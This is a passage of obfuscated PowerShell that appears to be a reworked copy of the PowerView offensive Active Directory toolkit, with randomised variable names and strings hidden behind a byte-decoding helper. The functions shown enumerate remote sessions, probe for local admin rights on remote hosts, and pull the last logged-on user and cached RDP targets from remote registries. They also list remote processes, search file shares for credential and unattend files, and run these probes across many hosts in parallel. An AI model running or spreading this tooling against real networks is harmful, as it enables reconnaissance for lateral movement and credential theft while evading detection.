                    # query for the source client IP with WTSQuerySessionInformation
                    #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
                    $sv3KwOR = $KBfbHiS::WTSQuerySessionInformation($qT9jK, $vPFl.SessionID, 14, [ref]$cg3KS6l, [ref]$AacDCgi6)

                    $u7LJPhLs = $cg3KS6l.ToInt64()
                    $azZXWT = New-Object System.Intptr -ArgumentList $u7LJPhLs
                    $HnnHRoS1 = $azZXWT -as $GkoHs2

                    $mts1 = $HnnHRoS1.Address       
                    if($mts1[2] -ne 0) {
                        $mts1 = [String]$mts1[2]+"."+[String]$mts1[3]+"."+[String]$mts1[4]+"."+[String]$mts1[5]
                    }
                    else {
                        $mts1 = $Null
                    }

                    $xtTSyNT | Add-Member Noteproperty 'SourceIP' $mts1
                    $xtTSyNT

                    # free up the memory buffer
                    $Null = $KBfbHiS::WTSFreeMemory($cg3KS6l)

                    $Offset += $RRXu
                }
                # free up the memory result buffer
                $Null = $KBfbHiS::WTSFreeMemoryEx(2, $I8LSIf, $Gew58)
            }
            # Close off the service handle
            $Null = $KBfbHiS::WTSCloseServer($qT9jK)
        }
        else {
            # otherwise it failed - get the last error
            #   error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx
            $zgfuO = $jAC8b6ZC::GetLastError()
            Write-Verbuse ((HandleResult95 @(33,227,106,218,60,64,157,12,199,65,153,33,74,162,52,153) @(117,164,44,160,88,5,203)) + $zgfuO)
        }
    }
}


function Invoke-CheckLocalAdminAccess {
<#
    .SYNOPSIS

        This function will use the OpenSCManagerW Win32API call to to establish
        a handle to the remote host. If this succeeds, the current user context
        has local administrator acess to the target.

        Idea stolen from the local_admin_search_enum post module in Metasploit written by:
            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

    .PARAMETER ComputerName

        The hostname to query for active sessions.

    .OUTPUTS

        $True if the current user has local admin access to the hostname, $False otherwise

    .EXAMPLE

        PS C:\> Invoke-CheckLocalAdminAccess -ComputerName sqlserver

        Returns active sessions on the local host.

    .LINK

        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]
        $ComputerName = 'localhost'
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple host object types from the pipeline
        $ComputerName = Get-NameField -Object $ComputerName

        # 0xF003F - SC_MANAGER_ALL_ACCESS
        #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
        $qT9jK = $FQMCj1Kr::OpenSCManagerW((([char]0x5c+[char]0x5c) + $ComputerName), 'ServicesActive', 0xF003F)

        Write-Debug ((HandleResult95 @(8,206,135,5,57,171,198,91,23,204,252,88,1,206,252,69,15,222,139,93,2,206,202,117,1,222,131,71,57,242,244,93,2,171,228,77,56,224,240,88,2,206,135,92,57,222,231,1,18,216,143,10) @(91,153,178,55)) + $qT9jK)

        # if we get a non-zero handle back, everything was successful
        if ($qT9jK -ne 0) {
            # Close off the service handle
            $Null = $FQMCj1Kr::CloseServiceHandle($qT9jK)
            $True
        }
        else {
            # otherwise it failed - get the last error
            #   error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx
            $zgfuO = $jAC8b6ZC::GetLastError()
            Write-Debug ((HandleResult95 @(246,250,108,5,101,33,173,121,233,248,23,88,93,68,151,103,241,234,96,93,94,68,161,87,255,234,104,71,101,120,159,127,252,159,15,77,100,106,155,88,252,245,23,7,85,75,147,108,199,158,16,1,78,82,228,40) @(165,173,89,55,7,19,217,21)) + $zgfuO)
            $False
        }
    }
}


function Get-LastLoggedOn {
<#
    .SYNOPSIS

        This function uses remote registry functionality to return
        the last user logged onto a target machine.

        Note: This function requires administrative rights on the
        machine you're enumerating.

    .PARAMETER ComputerName

        The hostname to query for the last logged on user.
        Defaults to the localhost.

    .EXAMPLE

        PS C:\> Get-LastLoggedOn

        Returns the last user logged onto the local machine.

    .EXAMPLE
        
        PS C:\> Get-LastLoggedOn -ComputerName WINDOWS1

        Returns the last user logged onto WINDOWS1
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]        
        $ComputerName = "."
    )

    process {

        # process multiple host object types from the pipeline
        $ComputerName = Get-NameField -Object $ComputerName

        # try to open up the remote registry key to grab the last logged on user
        try {
            $iIbun = [WMIClass](([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))) + $ComputerName + (HandleResult95 @(82,225,141,139,225,61,88,202,157,186,213,99,83,241,145,142,231,74,122,211,163,186,209,93,80,254,163,172,224,99,51,155) @(10,169,199,253,131,14)))
            $bUVaI = 2147483650
            $RXgmW2 = (HandleResult95 @(37,46,189,59,142,158,20,92,209,23,142,187,36,73,232,22,187,181,73,100,230,78,130,232,40,88,224,12,186,181,34,104,224,79,150,187,33,45,210,5,187,181,38,107,224,58,130,180,19,112,202,12,186,234,69,125,213,36,142,232,17,89,210,9,188,159,28,116,221,36,138,168,18,44,177,31,140,159,73,112,230,78,237,142,35,79,185,65) @(112,30,132,124,216,216))
            $Value = (HandleResult95 @(52,238,61,218,4,236,3,214,58,155,31,204,58,236,66,213,54,241,53,204,3,206,70,157) @(96,169,123,160))
            $iIbun.GetStringValue($bUVaI, $RXgmW2, $Value).sValue
        }
        catch {
            Write-Warning ((HandleResult95 @(152,194,179,114,90,86,23,182,216,152,47,106,90,6,246,204,175,65,38,99,35,162,216,146,117,126,69,53,173,136,167,122,90,91,11,163,225,199,122,105,119,9,133,142,188,81,42,102,8,142,134,200) @(207,187,245,22,19,19,65)) + $ComputerName + (HandleResult95 @(89,11,121,120,84,49,92,99,6,124,126,105,5,0,67,12,90,115,64,86,14,123,9,92,73,73,10,31,79,53,67,30,71,33,88,99,6,120,105,98,4,0,83,11,89,108,88,13,33,114,95,6) @(21,98,59,43,14,102,109)))
            $Null
        }
    }
}


function Get-CachedRDPConnection {
<#
    .SYNOPSIS

        Uses remote registry functionality to query all entries for the
        "Windows Remote Desktop Connection Client" on a machine, separated by
        user and target server.

        Note: This function requires administrative rights on the
        machine you're enumerating.

    .PARAMETER ComputerName

        The hostname to query for RDP client information.
        Defaults to localhost.

    .PARAMETER RemoteUserName

        The "domain\username" to use for the WMI call on the remote system.
        If supplied, 'RemotePassword' must be supplied as well.

    .PARAMETER RemotePassword

        The password to use for the WMI call on a remote system.

    .EXAMPLE

        PS C:\> Get-CachedRDPConnection

        Returns the RDP connection client information for the local machine.

    .EXAMPLE

        PS C:\> Get-CachedRDPConnection -ComputerName WINDOWS2.testlab.local

        Returns the RDP connection client information for the WINDOWS2.testlab.local machine

    .EXAMPLE

        PS C:\> Get-CachedRDPConnection -ComputerName WINDOWS2.testlab.local -RemoteUserName DOMAIN\user -RemotePassword Password123!

        Returns the RDP connection client information for the WINDOWS2.testlab.local machine using alternate credentials.
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName = (HandleResult95 @(215,201,48,152,167,179,205,225,107,193,176,212) @(181,142,9,242,254,228)),

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword
    )

    begin {
        if ($RemoteUserName -and $RemotePassword) {
            $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)
        }

        # HKEY_USERS
        $ZQ78s = 2147483651
    }

    process {

        try {
            if($Credential) {
                $iIbun = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -Credential $Credential -ErrorAction SilentlyContinue
            }
            else {
                $iIbun = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -ErrorAction SilentlyContinue
            }
        }
        catch {
            Write-Warning ((HandleResult95 @(134,161,225,188,239,78,170,179,160,252,139,231,39,187,154,131,202,146,184,19,170,149,196,150) @(212,249,171,197,141,125,227)) + $ComputerName + (HandleResult95 @(55,161,94,73,28,148,31,76,25,170,119,93,28,148,94,90,31,181,70,87,28,148,37,80,33,181,41,10,52,139,41,76,24,143,45,74,30,240,37,80,25,208,41,64,52,132,82,89,50,165,70,74,30,174,61,19,34,181,100,73,52,139,33,17,25,165,74,64,52,132,82,85,50,165,116,76,30,240,58,29) @(123,226,28,58,125,195,107,32)))
        }

        if(!$iIbun) {
            Write-Warning ((HandleResult95 @(133,180,13,45,67,139,209,108,142,187,9,62,123,224,214,113,182,187,114,58,104,249,165,54) @(215,236,71,84,33,184,152,11)) + $ComputerName + (HandleResult95 @(11,57,131,217,249,31,51,22,163,226,243,47,38,45,244,208,252,31,29,23,160,253,214,56,29,45,244,154,209,0,5,22,162,199,169,56,36,73,143,218,250,122,114,0,136,237,161,49,14,61,155,218,251,37,17,73,152,253,224,59,14,50,139,155,250,15,17,0,136,237,161,61,14,61,169,220,251,123,22,71) @(71,122,193,170,152,72)))
        }
        else {
            # extract out the SIDs of domain users in this hive
            $KsR0HWpu = ($iIbun.EnumKey($ZQ78s, "")).sNames | ? { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

            foreach ($vEV7hR in $KsR0HWpu) {

                try {
                    $UserName = Convert-SidToName $vEV7hR

                    # pull out all the cached RDP connections
                    $UQo2eC = $iIbun.EnumValues($ZQ78s,($vEV7hR + (HandleResult95 @(27,24,103,77,119,173,151,232,26,6,99,87,117,134,244,171,26,109,99,77,78,241,252,182,39,24,81,110,119,155,143,175,34,9,28,83,79,128,135,143,25,6,99,9,119,155,140,188,18,108,81,75,119,148,240,235,27,27,123,87,119,174,131,234,33,22,120,6) @(67,94,41,59,45,195,197,219)))).sNames

                    foreach ($tI3QosEk in $UQo2eC) {
                        # make sure this key is a cached connection
                        if($tI3QosEk -match 'MRU.*') {
                            $TargetServer = $iIbun.GetStringValue($ZQ78s, ($vEV7hR + (HandleResult95 @(10,85,106,223,20,100,226,194,11,75,110,197,22,79,129,129,11,32,110,223,45,56,137,156,54,85,92,252,20,82,250,133,51,68,17,193,44,73,242,165,8,75,110,155,20,82,249,150,3,33,92,217,20,93,133,193,10,86,118,197,20,103,246,192,48,91,117,148) @(82,19,36,169,78,10,176,241))), $tI3QosEk).sValue
                            
                            $yJJuerXu = New-Object PSObject
                            $yJJuerXu | Add-Member Noteproperty 'ComputerName' $ComputerName
                            $yJJuerXu | Add-Member Noteproperty 'UserName' $UserName
                            $yJJuerXu | Add-Member Noteproperty 'UserSID' $vEV7hR
                            $yJJuerXu | Add-Member Noteproperty 'TargetServer' $TargetServer
                            $yJJuerXu | Add-Member Noteproperty 'UsernameHint' $Null
                            $yJJuerXu
                        }
                    }

                    # pull out all the cached server info with username hints
                    $kODsSRgF = $iIbun.EnumKey($ZQ78s,($vEV7hR + (HandleResult95 @(198,55,218,71,206,197,53,91,199,41,222,93,204,238,86,24,199,66,222,71,247,153,94,5,250,55,236,100,206,243,45,28,255,38,161,89,246,232,37,60,196,41,222,3,206,243,46,15,207,67,236,65,206,252,82,88,198,55,218,93,247,197,61,4,253,31,217,12) @(158,113,148,49,148,171,103,104)))).sNames

                    foreach ($BCqCw1p in $kODsSRgF) {

                        $J8vp = $iIbun.GetStringValue($ZQ78s, ($vEV7hR + (HandleResult95 @(45,206,98,29,213,83,77,83,44,208,102,7,215,120,46,16,44,187,102,29,236,15,38,13,17,206,84,62,213,101,85,20,20,223,25,3,237,126,93,52,47,208,102,89,213,101,86,7,36,186,84,27,213,106,42,80,45,206,98,7,236,83,69,12,22,230,98,8) @(117,136,44,107,143,61,31,96)) + $BCqCw1p), 'UsernameHint').sValue
                        
                        $yJJuerXu = New-Object PSObject
                        $yJJuerXu | Add-Member Noteproperty 'ComputerName' $ComputerName
                        $yJJuerXu | Add-Member Noteproperty 'UserName' $UserName
                        $yJJuerXu | Add-Member Noteproperty 'UserSID' $vEV7hR
                        $yJJuerXu | Add-Member Noteproperty 'TargetServer' $BCqCw1p
                        $yJJuerXu | Add-Member Noteproperty 'UsernameHint' $J8vp
                        $yJJuerXu   
                    }

                }
                catch {
                    Write-Debug ((HandleResult95 @(159,43,60,143,175,64,63,192,132,50,75,203) @(205,115,118,246)) + $_)
                }
            }
        }
    }
}


function Get-NetProcess {
<#
    .SYNOPSIS

        Gets a list of processes/owners on a remote machine.

    .PARAMETER ComputerName

        The hostname to query processes. Defaults to the local host name.

    .PARAMETER RemoteUserName

        The "domain\username" to use for the WMI call on a remote system.
        If supplied, 'RemotePassword' must be supplied as well.

    .PARAMETER RemotePassword

        The password to use for the WMI call on a remote system.

    .EXAMPLE

        PS C:\> Get-NetProcess -ComputerName WINDOWS1
    
        Returns the current processes for WINDOWS1
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName,

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword
    )

    process {
        
        if($ComputerName) {
            # process multiple host object types from the pipeline
            $ComputerName = Get-NameField -Object $ComputerName          
        }
        else {
            # default to the local hostname
            $ComputerName = [System.Net.Dns]::GetHostName()
        }

        $Credential = $Null

        if($RemoteUserName) {
            if($RemotePassword) {
                $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force
                $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)

                # try to enumerate the processes on the remote machine using the supplied credential
                try {
                    Get-WMIobject -Class Win32_process -ComputerName $ComputerName -Credential $Credential | ForEach-Object {
                        $F98npsZ0 = $_.getowner();
                        $Process = New-Object PSObject
                        $Process | Add-Member Noteproperty 'ComputerName' $ComputerName
                        $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                        $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                        $Process | Add-Member Noteproperty 'Domain' $F98npsZ0.Domain
                        $Process | Add-Member Noteproperty 'User' $F98npsZ0.User
                        $Process
                    }
                }
                catch {
                    Write-Verbose ((HandleResult95 @(39,11,32,112,36,61,199,238,19,31,95,109,36,63,199,226,20,37,87,120,14,21,215,167,17,37,83,122,36,48,219,251,18,37,95,36,55,43,211,224,19,31,95,126,55,32,223,237,42,42,43,103,36,63,215,253,41,64,48,110,14,1,211,228,17,37,18,120,15,48,250,240,42,53,48,97,12,47,199,252,63,27,39,41) @(112,114,102,20,109,120,145,151)) + $_)
                }
            }
            else {
                Write-Warning (HandleResult95 @(236,119,89,211,242,72,85,219,217,89,38,135,225,88,93,223,216,61,81,132,217,61,85,220,242,73,46,134,216,61,78,208,226,89,103,205,217,119,93,222,225,93,93,205,223,86,93,192,217,73,115,219,225,77,90,138) @(187,14,31,183))
            }
        }
        else {
            # try to enumerate the processes on the remote machine
            try {
                Get-WMIobject -Class Win32_process -ComputerName $ComputerName | ForEach-Object {
                    $F98npsZ0 = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty 'ComputerName' $ComputerName
                    $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $Process | Add-Member Noteproperty 'Domain' $F98npsZ0.Domain
                    $Process | Add-Member Noteproperty 'User' $F98npsZ0.User
                    $Process
                }
            }
            catch {
                Write-Verbose ((HandleResult95 @(86,141,78,247,72,177,94,234,98,153,49,234,72,179,94,230,101,163,57,255,98,153,78,163,96,163,61,253,72,188,66,255,99,163,49,163,91,167,74,228,98,153,49,249,91,172,70,233,91,172,69,224,72,179,78,249,88,198,94,233,98,141,74,224,96,163,124,255,99,188,99,244,91,179,94,230,96,163,94,248,78,157,73,174) @(1,244,8,147)) + $_)
            }
        }
    }
}


function Find-InterestingFile {
<#
    .SYNOPSIS

        This function recursively searches a given UNC path for files with
        specific keywords in the name (default of pass, sensitive, secret, admin,
        login and unattend*.xml). The output can be piped out to a csv with the
        -OutFile flag. By default, hidden files/folders are included in search results.

    .PARAMETER Path

        UNC/local path to recursively search.

    .PARAMETER Terms

        Terms to search for.

    .PARAMETER OfficeDocs

        Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)

    .PARAMETER FreshEXEs

        Switch. Find .EXEs accessed within the last week.

    .PARAMETER LastAccessTime

        Only return files with a LastAccessTime greater than this date value.

    .PARAMETER LastWriteTime

        Only return files with a LastWriteTime greater than this date value.

    .PARAMETER CreationTime

        Only return files with a CreationTime greater than this date value.

    .PARAMETER ExcludeFolders

        Switch. Exclude folders from the search results.

    .PARAMETER ExcludeHidden

        Switch. Exclude hidden files and folders from the search results.

    .PARAMETER CheckWriteAccess

        Switch. Only returns files the current user has write access to.

    .PARAMETER OutFile

        Output results to a specified csv output file.

    .PARAMETER UsePSDrive

        Switch. Mount target remote path with temporary PSDrives.

    .PARAMETER Credential

        Credential to use to mount the PSDrive for searching.

    .OUTPUTS

        The full path, owner, lastaccess time, lastwrite time, and size for each found file.

    .EXAMPLE

        PS C:\> Find-InterestingFile -Path C:\Backup\
        
        Returns any files on the local path C:\Backup\ that have the default
        search term set in the title.

    .EXAMPLE

        PS C:\> Find-InterestingFile -Path \\WINDOWS7\Users\ -Terms salaries,email -OutFile out.csv
        
        Returns any files on the remote path \\WINDOWS7\Users\ that have 'salaries'
        or 'email' in the title, and writes the results out to a csv file
        named 'out.csv'

    .EXAMPLE

        PS C:\> Find-InterestingFile -Path \\WINDOWS7\Users\ -LastAccessTime (Get-Date).AddDays(-7)

        Returns any files on the remote path \\WINDOWS7\Users\ that have the default
        search term set in the title and were accessed within the last week.

    .LINK
        
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Path = '.\',

        [String[]]
        $Terms,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXEs,

        [String]
        $LastAccessTime,

        [String]
        $LastWriteTime,

        [String]
        $CreationTime,

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [String]
        $OutFile,

        [Switch]
        $UsePSDrive,

        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    begin {
        # default search terms
        $eswm = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential', '.config')

        if(!$Path.EndsWith('\')) {
            $Path = $Path + '\'
        }
        if($Credential -ne [System.Management.Automation.PSCredential]::Empty) { $UsePSDrive = $True }

        # check if custom search terms were passed
        if ($Terms) {
            if($Terms -isnot [system.array]) {
                $Terms = @($Terms)
            }
            $eswm = $Terms
        }

        if(-not $eswm[0].startswith("*")) {
            # append wildcards to the front and back of all search terms
            for ($kUfFVle = 0; $kUfFVle -lt $eswm.Count; $kUfFVle++) {
                $eswm[$kUfFVle] = ("*" + $($eswm[$kUfFVle]) + "*")
            }
        }

        # search just for office documents if specified
        if ($OfficeDocs) {
            $eswm = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }

        # find .exe's accessed within the last 7 days
        if($FreshEXEs) {
            # get an access time limit of 7 days ago
            $LastAccessTime = (get-date).AddDays(-7).ToString('MM/dd/yyyy')
            $eswm = '*.exe'
        }

        if($UsePSDrive) {
            # if we're PSDrives, create a temporary mount point
            $u5Ie777 = $Path.split('\')
            $mnwhsX0k = $u5Ie777[0..($u5Ie777.length-2)] -join '\'
            $FilePath = $u5Ie777[-1]
            $nXovd = ((HandleResult95 @(180,193,78,76,183,209,82,75,183,164,108,86,140,251,112,85,143,193,49,80,142,222,66,95,142,165,86,23,137,248,96,18,136,206,107,27) @(237,150,4,38)).ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose ((HandleResult95 @(17,7,69,52,145,181,23,32,30,104,144,188,38,23,58,53,146,152,4,109) @(69,80,124,5,243,219)) + $Path + (HandleResult95 @(195,253,42,91,122,78,28,128,195,242,57,70,127,94,127,154,233,246,62,112,78,41,123,151,235,237,38,77,82,94,111,222,195,244,65,28) @(138,181,124,33,27,25,41,238)) + $nXovd)

            try {
                $Null = New-PSDrive -Name $nXovd -Credential $Credential -PSProvider FileSystem -Root $mnwhsX0k -ErrorAction Stop
            }
            catch {
                Write-Debug ((HandleResult95 @(65,69,41,193,113,46,42,223,113,74,90,137,113,115,49,200,113,112,0,223,112,90,37,136,114,94,34,133) @(19,29,99,184)) + $Path + (HandleResult95 @(180,245,107,125) @(253,177,4,26,185)) + $_)
                return $Null
            }

            # so we can cd/dir the new drive
            $Path = $nXovd + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Olw="))) + $FilePath
        }
    }

    process {

        Write-Verbose ((HandleResult95 @(131,143,202,195,222,146,184,214,254,207,158,156,219,228,213,163,175,226,245,248,157,183,135,154) @(212,246,186,167,151)) + $Path)

        function Invoke-CheckWrite {
            # short helper to check is the current user can write to a file
            [CmdletBinding()]param([String]$Path)
            try {
                $FcEsz7IJ = [IO.FILE]::OpenWrite($Path)
                $FcEsz7IJ.Close()
                $True
            }
            catch {
                Write-Verbose -Message $Error[0]
                $False
            }
        }

        $fclLo =  @{
            'Path' = $Path
            'Recurse' = $True
            'Force' = $(-not $ExcludeHidden)
            'Include' = $eswm
            'ErrorAction' = 'SilentlyContinue'
        }

        Get-ChildItem @fclLo | ForEach-Object {
            Write-Verbose $_
            # check if we're excluding folders
            if(!$ExcludeFolders -or !$_.PSIsContainer) {$_}
        } | ForEach-Object {
            if($LastAccessTime -or $LastWriteTime -or $CreationTime) {
                if($LastAccessTime -and ($_.LastAccessTime -gt $LastAccessTime)) {$_}
                elseif($LastWriteTime -and ($_.LastWriteTime -gt $LastWriteTime)) {$_}
                elseif($CreationTime -and ($_.CreationTime -gt $CreationTime)) {$_}
            }
            else {$_}
        } | ForEach-Object {
            # filter for write access (if applicable)
            if((-not $CheckWriteAccess) -or (Invoke-CheckWrite -Path $_.FullName)) {$_}
        } | Select-Object FullName,@{Name='Owner';Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,CreationTime,Length | ForEach-Object {
            # check if we're outputting to the pipeline or an output file
            if($OutFile) {Export-PowerViewCSV -InputObject $_ -OutFile $OutFile}
            else {$_}
        }
    }

    end {
        if($UsePSDrive -and $nXovd) {
            Write-Verbose ((HandleResult95 @(123,148,71,136,34,29,163,97,158,45,77,158,117,187,22,90,154,82,190,17,123,201,67,133,33,118,163,125,181,1,19,196) @(46,249,17,252,64)) + $nXovd)
            Get-PSDrive -Name $nXovd -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}


########################################################
#
# 'Meta'-functions start below
#
########################################################

function Invoke-ThreadedFunction {
    # Helper used by any threaded host enumeration functions
    [CmdletBinding()]
    param(
        [Parameter(Position=0,Mandatory=$True)]
        [String[]]
        $ComputerName,

        [Parameter(Position=1,Mandatory=$True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position=2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        $Threads = 20,

        [Switch]
        $NoImports
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        Write-Verbose ((HandleResult95 @(181,136,233,1,171,183,203,19,134,182,223,22,171,182,172,84,128,166,211,9,129,152,219,19,184,152,219,10,128,194,215,85,129,139,246,2) @(226,241,153,101)) + $($ComputerName.count))

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $cAQFT9tE = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $cAQFT9tE.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # import the current session state's variables and functions so the chained PowerView
        #   functionality can be used by the threaded blocks
        if(!$NoImports) {

            # grab all the current variables for this runspace
            $GDhTL = Get-Variable -Scope 2

            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
            $AQCOs = @("?",(HandleResult95 @(75,210,82,18,95,227,47,183) @(18,138,24,124,60,148)),(HandleResult95 @(156,13,109,215,17,60,244,76,14,247,40,126,175,120,2,237,43,89,252,83) @(205,63,84,162,114,14)),(HandleResult95 @(118,112,19,214,70,27,16,146) @(36,40,89,175)),(HandleResult95 @(86,192,202,192,1,55,206,146,205,15,61,237,243,158,97,113,252,229,250,108,96,217,159,145) @(4,152,162,172,88)),(HandleResult95 @(226,219,179,250,219,132,160,180) @(184,182,245,137)),(HandleResult95 @(160,187,186,77,47,62,219,244) @(243,254,131,3,125,111,230,201)),(HandleResult95 @(4,16,90,0,13,184,98,67) @(87,87,99,122,105,249,95,126)),(HandleResult95 @(233,208,9,139,143,205,94,181) @(136,135,60,252,235,149,15)),(HandleResult95 @(12,179,111,184,73,92,206,168,6,137,42,163,116,55,205,197) @(95,228,90,207,45,4,156,248)),(HandleResult95 @(243,217,243,31,193,208,205,103,197,219,243,88,193,208,186,44,246,188,140,26,194,233,173,107) @(167,142,181,43,160,135,252,86)),(HandleResult95 @(111,129,4,114,38,108,231,115,36,18,105,175,35,30,29,87,135,112,127,118,89,184,19,123) @(59,214,66,70,71)),(HandleResult95 @(239,96,202,97,251,6,46,26,217,98,218,44,249,60,38,82,234,5,181,100,248,63,78,22) @(187,55,140,85,154,81,31,43)),(HandleResult95 @(191,81,76,252,230,3,12,218,100,95,146,182,54,80,165,54,107,159,190,33,108,217,63,59,170,233,5,0) @(235,6,10,200,135,84,61)),(HandleResult95 @(11,249,125,163,51,104,110,159,89,194,58,79,60,157,105,225,49,81,51,234,89,164,4,74,59,239,6,170) @(95,174,59,151,82,63)),(HandleResult95 @(34,75,198,238,95,220,104,71,126,214,128,86,232,52,26,116,217,183,70,231,8,68,37,177,184,80,218,100) @(118,28,128,218,62,139,89)),(HandleResult95 @(207,161,196,105,188,245,163,222,122,236,221,201,201,116,231,238) @(155,249,168,35,222)),(HandleResult95 @(250,46,47,141,45,255,165,125) @(152,64,121,254,79,190)),(HandleResult95 @(34,126,139,70) @(119,59,231,3,49,142)),(HandleResult95 @(204,253,130,250,120,136,207,206,150,255,88,211,250,214,138,205,64,227,203,215,175,215,87,134) @(153,187,204,185,26,187)),(HandleResult95 @(38,211,49,43,233,12,136,61,42,194,74,4,222,121,255,121,18,212,66,82) @(115,149,127,111,139,62,185,73)),(HandleResult95 @(242,28,218,42,158,240,34,164,10,162,237,54) @(167,90,148,110,250)),(HandleResult95 @(171,34,133,207,19,136,134,150,0,156,242,121,138,155,184,29,146,221,120,179,184,185,50,178,220,36,153,175,154,51,157,240) @(254,100,203,138,73,223,220)),(HandleResult95 @(171,194,129,152,133,206,181,137) @(254,132,207,209,209)),(HandleResult95 @(47,32,160,69,147,242,48,22,141,89,152,146,24,84,215,33) @(122,102,238,17,202,193)),(HandleResult95 @(21,198,84,25,19,213,84,126,34,200,72,126,35,237,79,114) @(64,128,26,79)),(HandleResult95 @(188,173,153,142,23,177,161,173,184,26,208,158,129,158,11,128,137,144,140,112) @(233,235,215,217,77)),(HandleResult95 @(70,74,139,68) @(19,12,239,1,125,29,22)),(HandleResult95 @(224,143,210,67,56,4,217,255,231,251,18,103) @(181,189,186,47,90,67,161)),(HandleResult95 @(82,121,100,60,32,16,184,126,40,58,124,9,71,189,81,33,91,14,63,88,177,70,119,53) @(7,74,8,73,121,34,208)),(HandleResult95 @(1,156,9,142,0,212,172,188) @(101,212,67,191,90,133,145,129)))

            # Add Variables from Parent Scope (current runspace) into the InitialSessionState
            ForEach($leNG in $GDhTL) {
                if($AQCOs -NotContains $leNG.Name) {
                $cAQFT9tE.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $leNG.name,$leNG.Value,$leNG.description,$leNG.options,$leNG.attributes))
                }
            }

            # Add Functions from current runspace to the InitialSessionState
            ForEach($xAasLS2 in (Get-ChildItem Function:)) {
                $cAQFT9tE.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $xAasLS2.Name, $xAasLS2.Definition))
            }
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        #   Thanks Carlos!

        # create a pool of maxThread runspaces
        $VqFs = [runspacefactory]::CreateRunspacePool(1, $Threads, $cAQFT9tE, $Host)
        $VqFs.Open()

        $ht59LS = @()
        $PS = @()
        $jyjWpx9 = @()

        $ypmBN = 0
    }

    process {

        ForEach ($fa0ya in $ComputerName) {

            # make sure we get a server name
            if ($fa0ya -ne '') {
                # Write-Verbose "[*] Enumerating server $Computer ($($Counter+1) of $($ComputerName.count))"

                While ($($VqFs.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -MilliSeconds 500
                }

                # create a "powershell pipeline runner"
                $PS += [powershell]::create()

                $PS[$ypmBN].runspacepool = $VqFs

                # add the script block + arguments
                $Null = $PS[$ypmBN].AddScript($ScriptBlock).AddParameter('ComputerName', $fa0ya)
                if($ScriptParameters) {
                    ForEach ($XVfN in $ScriptParameters.GetEnumerator()) {
                        $Null = $PS[$ypmBN].AddParameter($XVfN.Name, $XVfN.Value)
                    }
                }

                # start job
                $ht59LS += $PS[$ypmBN].BeginInvoke();

                # store wait handles for WaitForAll call
                $jyjWpx9 += $ht59LS[$ypmBN].AsyncWaitHandle
            }
            $ypmBN = $ypmBN + 1
        }
    }

    end {

